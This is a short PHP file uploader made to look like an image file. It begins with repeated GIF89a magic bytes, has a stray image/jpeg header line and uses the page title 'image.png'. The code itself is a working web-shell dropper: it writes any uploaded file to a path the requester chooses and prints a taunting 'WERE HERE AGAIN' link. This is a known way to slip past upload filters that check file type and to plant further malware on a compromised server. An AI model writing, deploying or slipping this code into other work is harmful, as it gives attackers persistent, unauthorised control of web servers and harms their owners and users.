GIF89a; 
GIF89a; 
GIF89a; 
GIF89a;

header('Content-Type: image/jpeg');

<?php

$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>WERE HERE AGAIN!!!! [CLICK-Me]</a></h1>";
    }
}echo '<html><head><title>image.png</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
?>